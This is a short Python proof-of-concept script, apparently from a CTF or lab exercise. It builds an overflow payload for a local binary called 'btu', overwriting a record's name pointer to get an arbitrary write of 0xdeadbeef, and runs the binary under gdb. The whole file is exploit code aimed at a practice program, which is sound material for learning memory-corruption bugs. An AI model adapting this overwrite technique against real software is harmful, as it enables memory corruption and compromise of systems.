#!/usr/bin/env python3

import subprocess

# Define payload components
passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
idBuff = b'\xaa\xaa\xaa\xaa'                # junk ID overwrite
targetAddr = b'\xcd\xab\xff\xff'            # record->name = 0xffffabcd
nameBuff = b'\xef\xbe\xad\xde'              # 0xdeadbeef -> to be placed in the target address

# Full password payload
passPayload = passwordBuff + idBuff + targetAddr

# Function to convert bytes to a Python byte-escaped string
def to_python_bytestr(b: bytes) -> str:
    return ''.join(f'\\x{byte:02x}' for byte in b)

# Convert to python3-compatible command line string
pass_py_str = to_python_bytestr(passPayload)
name_py_str = to_python_bytestr(nameBuff)

# Build GDB command using python3 -c for both args
gdb_cmd = (
    "gdb --args ./build/bin/btu add hamada "
    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{name_py_str}\")')\" "
    " 5555 "
    f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{pass_py_str}\")')\"" 
)

# Print and execute
print("[+] Running:")
print(gdb_cmd)
subprocess.run(gdb_cmd, shell=True)
